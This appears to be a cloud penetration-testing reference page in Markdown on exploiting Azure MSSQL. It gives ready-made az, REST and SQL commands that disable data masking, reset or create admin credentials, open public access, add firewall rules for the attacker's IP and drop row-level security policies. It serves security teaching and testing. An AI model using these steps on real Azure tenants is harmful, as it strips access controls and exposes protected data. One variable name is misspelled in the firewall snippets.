---
title: "Azure MSSQL Explotation"
order: 73
description: Explotation of Azure MSSQL
---

## Log in to MSSQL

```bash
sqlcmd -S $SQL_SERVER.database.windows.net \
  -d <database> \
  --user-name '<username>' \
  --password '<password>'
```

### MSSQL Enumeration

```sql
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
GO

SELECT * FROM <table>
```

## Modify or disable data masking policies

> The permission needed is:
> - **Microsoft.Sql/servers/databases/dataMaskingPolicies/write**
>
> Modify (or disable) the data masking policies on your SQL databases.

```bash
az rest --method PUT \
  --uri "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Sql/servers/$SQL_SERVER/databases/$DATABASE/dataMaskingPolicies/Default?api-version=2021-11-01" \
  --body '{
    "properties": {
      "dataMaskingState": "Disable"
    }
  }'
```

## Modify MSSQL Server configuration

> The permission needed is:
> - **Microsoft.Sql/servers/write**
>
> With these permissions, a user can perform privilege escalation by updating or creating Azure SQL servers and modifying critical configurations, including administrative credentials.

### Change Server Password / Create new server

```bash
az sql server update \
  --name <server_name> \
  --resource-group <resource_group_name> \
  --admin-password <new_password>
```

```bash
az sql server create \
  --name <new_server_name> \
  --resource-group <resource_group_name> \
  --location <location> \
  --admin-user <admin_username> \
  --admin-password <admin_password>
```

### Enable Public Access

```bash
az sql server update \
  --name <server-name> \
  --resource-group <resource-group> \
  --enable-public-network true
```

## Change firewall rules

> The permission needed is:
> - **Microsoft.Sql/servers/firewallRules/write**
>
> An attacker can manipulate firewall rules on Azure SQL servers to allow unauthorized access.

```bash
MYIP=$(curl -s ifconfig.me)

az sql server firewall-rule create \
  --name allow_flag \
  --server $SQL_SEVER \
  --resource-group $RESOURCE_GROUP \
  --start-ip-address $MYIP \
  --end-ip-address $MYIP
```

```bash
MYIP=$(curl -s ifconfig.me)

az sql server firewall-rule update \
  --name allow_flag \
  --server $SQL_SEVER \
  --resource-group $RESOURCE_GROUP \
  --start-ip-address $MYIP \
  --end-ip-address $MYIP
```

## Delete Row Level Security

If you loggin as admin, you can remove the policies of the admin itself and other users.

```sql
SELECT * FROM sys.security_policies; 
GO

DROP SECURITY POLICY [Name_of_policy];
```